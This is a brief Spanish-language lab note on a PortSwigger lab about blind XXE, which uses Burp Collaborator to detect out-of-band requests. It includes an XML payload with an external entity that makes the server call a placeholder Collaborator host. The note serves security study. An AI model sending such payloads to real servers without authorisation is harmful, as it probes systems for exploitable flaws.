# XXE ciego con interacción out-of-band

Tags: #XXE #PortSwigger #XML 

```bash 
En este lab se trabaja con vulnerabilidades de tipo XXE, centrándonos en el escenario más complejo: una XXE ciega. En este caso, el servidor procesa XML pero no devuelve en la respuesta ningún dato que evidencie la ejecución del payload, lo que impide confirmar la explotación de forma directa. Aprovechar Burp Collaborator, que nos permite observar si se han producido solicitudes DNS o HTTP hacia un subdominio generado por su plataforma.
```

```xml
<!-- Petición modificada colocando una entidad externa general -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/testXXE">]>      
	<stockCehck>
		<productId>
			&xxe;
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>


Notas:
	1. OOB = Colocar una URL externa y cargar un recurso 
```